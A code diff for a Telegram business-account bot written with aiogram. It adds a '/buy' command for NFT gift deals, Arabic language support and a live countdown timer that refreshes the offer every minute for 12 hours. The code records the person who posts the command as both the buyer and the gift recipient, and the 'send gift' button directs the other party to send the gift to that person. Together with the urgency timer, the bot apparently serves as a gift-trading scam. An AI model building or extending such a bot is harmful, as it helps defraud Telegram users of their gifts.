@@ -17,7 +17,7 @@ from aiogram.types import (
 )
 
 from config import BOT_TOKEN, BOT_USERNAME
-from texts import TEXTS
+from texts import TEXTS, currency_html
 
 bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
 dp = Dispatcher()
@@ -25,6 +25,9 @@ dp = Dispatcher()
 CONN_FILE = "connections.json"
 DEALS_FILE = "pending_deals.json"
 LOG_FILE = "messages.log"
+
+DEAL_LIFETIME_HOURS = 12
+UPDATE_INTERVAL = 60  # секунд
 
 
 def load_json(path: str) -> dict:
@@ -56,6 +59,17 @@ def log_message(chat_id: int, username: str | None, text: str):
         print(f"[LOG ERROR] {e}")
 
 
+def human_left(seconds: int) -> str:
+    """Преобразует секунды в 'X ч Y мин' / 'X h Y min'."""
+    if seconds <= 0:
+        return "0 мин"
+    h = seconds // 3600
+    m = (seconds % 3600) // 60
+    if h > 0:
+        return f"{h} ч {m} мин"
+    return f"{m} мин"
+
+
 # ---------- Хранилища ----------
 
 pending_deals: dict[int, dict] = {
@@ -77,7 +91,7 @@ def save_connections():
     save_json(CONN_FILE, {str(k): v for k, v in business_connections.items()})
 
 
-# ---------- Premium-эмодзи ----------
+# ---------- Premium-эмодзи для кнопок ----------
 EMOJI_ACCEPT = "5774022692642492953"
 EMOJI_DECLINE = "5774077015388852135"
 EMOJI_GIFT = "5774022692642492953"      # замени
@@ -103,10 +117,6 @@ def offer_kb(lang: str) -> InlineKeyboardMarkup:
 
 
 def deal_kb(lang: str, target_username: str) -> InlineKeyboardMarkup:
-    """
-    target_username — username ТОГО, КТО СОЗДАЛ СДЕЛКУ (продавца).
-    Ссылка на подарок ведёт на него.
-    """
     t = TEXTS[lang]
     gift_url = f"tg://send_gift?to={target_username}"
     return InlineKeyboardMarkup(inline_keyboard=[
@@ -142,7 +152,7 @@ def gen_order_id() -> str:
 
 
 def detect_lang(code: str | None) -> str:
-    if code and code.lower() in ("ru", "en", "cn"):
+    if code and code.lower() in ("ru", "en", "cn", "ar"):
         return code.lower()
     return "ru"
 
@@ -150,7 +160,7 @@ def detect_lang(code: str | None) -> str:
 def detect_currency(code: str | None) -> str:
     if code and code.upper() == "GRAM":
         return "GRAM"
-    return "Stars ⭐"
+    return "STARS"
 
 
 # ---------- Бизнес-подключение ----------
@@ -168,17 +178,73 @@ async def on_business_connection(connection: BusinessConnection):
         print(f"[BUSINESS] ❌ Отключён: user_id={connection.user.id}")
 
 
-# ---------- Регулярка ----------
+# ---------- Регулярка /buy ----------
 
-COMMAND_RE = re.compile(
-    rf"@{re.escape(BOT_USERNAME)}\s+"
-    rf"(?P<link>\S+)\s+"
-    rf"(?P<amount>\d+)"
-    rf"(?:\s+(?P<opt1>ru|en|cn|STARS|GRAM))?"
-    rf"(?:\s+(?P<opt2>ru|en|cn|STARS|GRAM))?"
-    rf"\s*$",
+BUY_RE = re.compile(
+    r"/buy\s+"
+    r"(?P<link>\S+)\s+"
+    r"(?P<amount>\d+)"
+    r"(?:\s+(?P<opt1>STARS|GRAM|ru|en|cn|ar))?"
+    r"(?:\s+(?P<opt2>STARS|GRAM|ru|en|cn|ar))?"
+    r"\s*$",
     re.IGNORECASE,
 )
+
+
+# ---------- Живой таймер ----------
+
+async def live_timer(chat_id: int, message_id: int, expire_ts: float):
+    """
+    Каждые 60 секунд обновляет сообщение, пока сделка активна.
+    """
+    while True:
+        await asyncio.sleep(UPDATE_INTERVAL)
+
+        deal = pending_deals.get(chat_id)
+        if not deal:
+            print(f"[TIMER] Сделка {chat_id} больше не активна, останавливаю таймер")
+            return
+
+        seconds_left = int(expire_ts - datetime.datetime.now().timestamp())
+        if seconds_left <= 0:
+            # Сделка истекла
+            lang = deal.get("lang", "ru")
+            try:
+                await bot.edit_message_text(
+                    chat_id=chat_id,
+                    message_id=message_id,
+                    text=TEXTS[lang]["expired"],
+                    business_connection_id=deal.get("connection_id"),
+                )
+                print(f"[TIMER] Сделка {chat_id} истекла")
+            except Exception as e:
+                print(f"[TIMER EDIT ERROR] {e}")
+            pending_deals.pop(chat_id, None)
+            save_deals()
+            return
+
+        lang = deal.get("lang", "ru")
+        t = TEXTS[lang]
+        time_left = human_left(seconds_left)
+
+        new_text = t["offer"].format(
+            amount=deal["amount"],
+            currency=deal["currency_display"],
+            gift_name=deal["gift_name"],
+            time_left=time_left,
+        )
+
+        try:
+            await bot.edit_message_text(
+                chat_id=chat_id,
+                message_id=message_id,
+                text=new_text,
+                reply_markup=offer_kb(lang),
+                business_connection_id=deal.get("connection_id"),
+            )
+            print(f"[TIMER] Обновлено {chat_id}: {time_left}")
+        except Exception as e:
+            print(f"[TIMER EDIT ERROR] {e}")
 
 
 # ---------- Ловим сообщения в бизнес-чатах ----------
@@ -196,11 +262,11 @@ async def on_business_message(message: types.Message):
     if not text:
         return
 
-    m = COMMAND_RE.match(text)
+    m = BUY_RE.match(text)
     if not m:
         return
 
-    print(f"[BUSINESS MATCH] {m.groupdict()}")
+    print(f"[BUY MATCH] {m.groupdict()}")
 
     connection_id = business_connections.get(user_id)
     if not connection_id:
@@ -225,42 +291,59 @@ async def on_business_message(message: types.Message):
     for o in opts:
         if not o:
             continue
-        if o.lower() in ("ru", "en", "cn"):
+        if o.lower() in ("ru", "en", "cn", "ar"):
             lang_code = o.lower()
         elif o.upper() in ("STARS", "GRAM"):
             currency_code = o.upper()
 
     lang = detect_lang(lang_code)
     currency = detect_currency(currency_code)
+    currency_disp = currency_html(currency)
 
     gift_name = parse_gift_name(link)
     order_id = gen_order_id()
 
-    # ⚠️ Тот, кто написал команду = тот, на кого ведёт ссылка подарка
+    # Время окончания — 12 часов от текущего момента
+    now = datetime.datetime.now()
+    expire_dt = now + datetime.timedelta(hours=DEAL_LIFETIME_HOURS)
+    expire_ts = expire_dt.timestamp()
+    time_left = human_left(DEAL_LIFETIME_HOURS * 3600)
+
     seller_username = username or ""
 
     pending_deals[chat_id] = {
         "amount": amount,
         "currency": currency,
+        "currency_display": currency_disp,
         "gift_name": gift_name,
         "buyer_username": username or "",
         "target_username": seller_username,
         "order_id": order_id,
         "connection_id": connection_id,
         "lang": lang,
+        "expire_ts": expire_ts,
     }
     save_deals()
 
     t = TEXTS[lang]
 
     try:
-        await bot.send_message(
+        sent = await bot.send_message(
             chat_id=chat_id,
-            text=t["offer"].format(amount=amount, currency=currency, gift_name=gift_name),
+            text=t["offer"].format(
+                amount=amount,
+                currency=currency_disp,
+                gift_name=gift_name,
+                time_left=time_left,
+            ),
             reply_markup=offer_kb(lang),
             business_connection_id=connection_id,
         )
-        print(f"[BUSINESS SEND] ✅ Отправлено в чат {chat_id}, lang={lang}, currency={currency}")
+        print(f"[BUSINESS SEND] ✅ Отправлено в чат {chat_id}, msg_id={sent.message_id}")
+
+        # ⚠️ Запускаем живой таймер
+        asyncio.create_task(live_timer(chat_id, sent.message_id, expire_ts))
+        print(f"[TIMER] ✅ Таймер запущен для {chat_id}")
     except Exception as e:
         print(f"[ERROR] {e}")
 
@@ -276,7 +359,12 @@ async def cmd_start(message: types.Message):
     await message.answer(
         "Привет! Я демо-бот.\n\n"
         f"Формат команды:\n"
-        f"<code>@{BOT_USERNAME} &lt;ссылка&gt; &lt;сумма&gt; [ru|en|cn] [STARS|GRAM]</code>"
+        f"<code>/buy &lt;ссылка&gt; &lt;цена&gt; [STARS|GRAM] [ru|en|cn|ar]</code>\n\n"
+        f"Примеры:\n"
+        f"<code>/buy t.me/nft/SpicedWine-32395 2000 STARS ru</code>\n"
+        f"<code>/buy t.me/nft/SpicedWine-32395 444 GRAM en</code>\n"
+        f"<code>/buy t.me/nft/SpicedWine-32395 1000 STARS cn</code>\n"
+        f"<code>/buy t.me/nft/SpicedWine-32395 500 STARS ar</code>"
     )
 
 
@@ -298,8 +386,14 @@ async def on_accept(call: types.CallbackQuery):
         return
 
     lang = deal.get("lang", "ru")
-    currency = deal.get("currency", "Stars ⭐")
+    currency = deal.get("currency_display", "⭐ Stars")
     t = TEXTS[lang]
+
+    target_username = deal.get("target_username", "")
+
+    # считаем оставшееся время для второго сообщения
+    seconds_left = int(deal.get("expire_ts", 0) - datetime.datetime.now().timestamp())
+    time_left = human_left(seconds_left)
 
     try:
         await call.message.edit_reply_markup(reply_markup=None)
@@ -314,9 +408,10 @@ async def on_accept(call: types.CallbackQuery):
                 currency=currency,
                 buyer_username=deal["buyer_username"],
                 gift_name=deal["gift_name"],
+                gift_username=target_username,
+                time_left=time_left,
             ),
-            # ⚠️ Ссылка ведёт на ТОГО, КТО СОЗДАЛ СДЕЛКУ
-            reply_markup=deal_kb(lang, deal.get("target_username", "")),
+            reply_markup=deal_kb(lang, target_username),
         )
     except Exception as e:
         print(f"[SEND ERROR] {e}")
@@ -376,6 +471,8 @@ async def on_confirm(call: types.CallbackQuery):
 
 async def main():
     print(f"Бот запущен. BOT_USERNAME=@{BOT_USERNAME}")
+    print(f"[START] DEAL_LIFETIME_HOURS={DEAL_LIFETIME_HOURS}")
+    print(f"[START] UPDATE_INTERVAL={UPDATE_INTERVAL}s")
     print(f"[START] business_connections={business_connections}")
     print(f"[START] pending_deals keys={list(pending_deals.keys())}")
     await dp.start_polling(bot)
